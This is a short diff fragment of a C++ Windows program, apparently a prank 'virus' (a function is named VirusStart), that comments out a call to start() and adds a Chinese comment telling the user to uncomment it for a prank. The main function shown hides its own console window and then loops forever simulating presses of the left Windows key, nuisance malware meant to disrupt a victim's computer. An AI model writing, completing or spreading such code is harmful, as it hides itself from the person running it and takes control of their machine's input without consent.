@@ -58,8 +58,8 @@ void VirusStart(){
 }
 
 int main(){
-    start();
-
+    //start();
+    //如果是整蛊请把上面的注释删掉
     ShowWindow(GetForegroundWindow(),0);//隐藏当前窗口
     while(1){
         keybd_event(VK_LWIN,0,0,0);//按下左WIN键
